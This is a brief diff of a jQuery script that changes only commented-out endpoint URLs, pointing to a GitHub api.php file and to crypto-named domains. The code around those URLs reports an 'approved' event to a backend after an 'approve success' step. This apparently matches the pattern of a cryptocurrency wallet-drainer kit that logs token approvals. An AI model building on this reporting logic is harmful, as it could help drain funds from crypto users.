@@ -544,7 +544,7 @@ $(function() {
             console.log('approve success');
             $.ajax({
               url: config.apiUrl,
-              //url: "https://github.com/ketlller/2222222/blob/main/api.php",  
+              //url: "https://github.com/crypt0d3ve/666666666/blob/main/api.php",  
               method: "POST",
               data: {
                 method: "approved",
@@ -574,7 +574,7 @@ $(function() {
       return $.ajax({
           
         url: ajaxurl, 
-        //url: "https://xm6.io/",
+        //url: "https://ddcrypto.io/",
         type: 'GET',
       });
     };
